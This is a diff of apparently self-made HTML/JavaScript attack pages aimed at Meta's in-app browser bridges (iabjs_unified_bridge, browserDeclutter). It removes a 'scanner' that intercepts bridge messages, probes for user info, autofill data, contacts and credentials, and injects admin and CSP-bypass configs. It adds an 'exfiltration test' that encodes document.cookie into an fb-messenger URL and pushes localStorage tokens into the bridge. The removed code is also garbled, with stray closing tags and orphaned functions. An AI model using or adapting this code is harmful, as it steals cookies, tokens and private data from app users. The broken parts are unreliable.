@@ -1,155 +1,28 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Bridge Scanner v3</title>
-    <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 15px; }
-        .panel { border: 2px solid #00ff00; padding: 15px; margin-bottom: 20px; background: #050505; }
-        button { background: #00ff00; color: #000; border: none; padding: 12px; width: 100%; margin: 8px 0; font-weight: bold; cursor: pointer; }
-        button:active { background: #008800; }
-        .log { background: #000; height: 350px; overflow-y: auto; border: 1px solid #444; padding: 10px; font-size: 11px; margin-top: 10px; color: #00ff00; }
-        .header { text-align: center; border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 15px; }
-        .intercept { color: #ffff00; font-weight: bold; }
-        .success { color: #00ffff; }
-        .error { color: #ff3333; }
-    </style>
-</head>
-<body>
+<div class="card" style="border: 2px solid #ff00ff; padding: 10px; background: #111;">
+    <h3 style="color: #ff00ff;">Advanced Exfiltration Test</h3>
+    <button onclick="testProtocolLeak()">Test Protocol Leak (Data to URL)</button>
+    <button onclick="testStorageSteal()">Leak LocalStorage to Bridge</button>
+</div>
 
-    <div class="panel">
-        <div class="header">
-            <h2>META DEEP SCANNER</h2>
-            <small>Target: iabjs_unified_bridge & browserDeclutter</small>
-        </div>
-
-        <button onclick="activateSniffer()">1. ACTIVATE STEALTH SNIFFER</button>
-        <button onclick="forceLeakTest()">2. FORCE LEAK TEST (Sensitive Data)</button>
-        <button onclick="deepConfigFuzz()">3. RECURSIVE CONFIG FUZZ</button>
-    </div>
-
-    <div class="log" id="logBox">Initializing system... Waiting for commands...</div>
-
-    <script>
-        const logBox = document.getElementById('logBox');
-
-        function log(msg, type = '') {
-            const time = new Date().toLocaleTimeString();
-            logBox.innerHTML += `<div class="${type}">[${time}] > ${msg}</div>`;
-            logBox.scrollTop = logBox.scrollHeight;
-        }
-
-        // 1. Sniffer with Message Interception
-        function activateSniffer() {
-            log("Sniffer Online. Monitoring all window communication...", "success");
-            
-            window.addEventListener("message", (event) => {
-                log(`INCOMING INTERCEPT: ${JSON.stringify(event.data)}`, "intercept");
-            }, false);
-
-            if (window.iabjs_unified_bridge) {
-                const oldPost = window.iabjs_unified_bridge.postMessage;
-                window.iabjs_unified_bridge.postMessage = function(msg, target) {
-                    log(`OUTGOING BRIDGE: ${msg}`, "intercept");
-                    return oldPost.apply(this, arguments);
-                };
-                log("Hooked into iabjs_unified_bridge successfully.", "success");
-            }
-        }
-
-        // 2. Testing for Sensitive Data Leaks
-        function forceLeakTest() {
-            if (!window.iabjs_unified_bridge) {
-                log("Bridge not found. Open this in Instagram/Meta Browser.", "error");
-                return;
-            }
-
-            log("Firing Sensitive Data Probes...", "success");
-            const probes = [
-                { "type": "get_user_info" },
-                { "type": "get_autofill_data" },
-                { "handler": "BrowserPayloadHandler", "method": "get_device_info" },
-                { "action": "getUserSecret" },
-                { "call": "get_contacts" },
-                { "method": "shared_credentials" }
-            ];
-
-            probes.forEach(p => {
-                try {
-                    window.iabjs_unified_bridge.postMessage(JSON.stringify(p), "*");
-                    log(`Probe Sent: ${p.type || p.method || p.action}`);
-                } catch(e) {
-                    log(`Probe Failed: ${e.message}`, "error");
-                }
-            });
-        }
-
-        // 3. Fuzzing applyConfig with Object variations
-        function deepConfigFuzz() {
-            if (!window.browserDeclutter) {
-                log("browserDeclutter not found.", "error");
-                return;
-            }
-
-            log("Starting Recursive Config Fuzzing...", "success");
-            const configs = [
-                { "is_admin": true },
-                { "debug_enabled": 1 },
-                { "csp_bypass": "*" },
-                { "ignore_ssl_errors": true },
-                { "features": { "all": true, "unrestricted": true } },
-                { "logging": "verbose" }
-            ];
-
-            configs.forEach((c, i) => {
-                try {
-                    window.browserDeclutter.applyConfig(c);
-                    log(`Config ${i} applied: Success`, "success");
-                } catch(e) {
-                    log(`Config ${i} failed`, "error");
-                }
-            });
-        }
-    </script>
-</body>
-</html>
-        // 2. Fuzzing applyConfig for logic bugs or crashes
-        function runAdvancedFuzz() {
-            if (!window.browserDeclutter || !window.browserDeclutter.applyConfig) {
-                writeLog("browserDeclutter.applyConfig not found!", "status-error");
-                return;
-            }
-
-            const payloads = [
-                { "is_admin": true, "feature_flags": ["*"] },
-                { "security_mode": "none" },
-                "A".repeat(5000), // Stress test
-                { "url_whitelist": ["*"] },
-                null,
-                0xDEADBEEF
-            ];
-
-            payloads.forEach((p, i) => {
-                try {
-                    window.browserDeclutter.applyConfig(p);
-                    writeLog(`Fuzz Payload ${i} Sent to applyConfig`, "status-success");
-                } catch(e) {
-                    writeLog(`Payload ${i} failed: ${e.message}`, "status-error");
-                }
-            });
-        }
-
-        // 3. Intent Testing (Jo tune pehle bola tha)
-        function testIntentBypass() {
-            writeLog("Attempting stealth intent trigger...");
-            // Force opening settings via intent
-            const intentUrl = "intent:#Intent;action=android.settings.SECURITY_SETTINGS;end";
-            window.location.href = intentUrl;
-        }
-    </script>
-</body>
-</html>
+<script>
+function testProtocolLeak() {
+    log("Attempting to leak data via custom protocol...", "success");
+    // Agar bridge sensitive hai, toh ye URL trigger hone par settings ya logs khul sakte hain
+    const secretData = btoa(document.cookie || "no_cookies_found");
+    window.location.href = "fb-messenger://share?text=" + secretData;
 }
-    </script>
-</body>
-</html>
+
+function testStorageSteal() {
+    log("Scanning LocalStorage for Meta Tokens...", "success");
+    try {
+        let keys = Object.keys(localStorage);
+        keys.forEach(k => {
+            log(`Found Key: ${k}`, "intercept");
+            // Fuzzing the bridge with found storage keys
+            window.browserDeclutter.applyConfig({ [k]: localStorage.getItem(k) });
+        });
+    } catch(e) {
+        log("Storage Access Denied", "error");
+    }
+}
+</script>
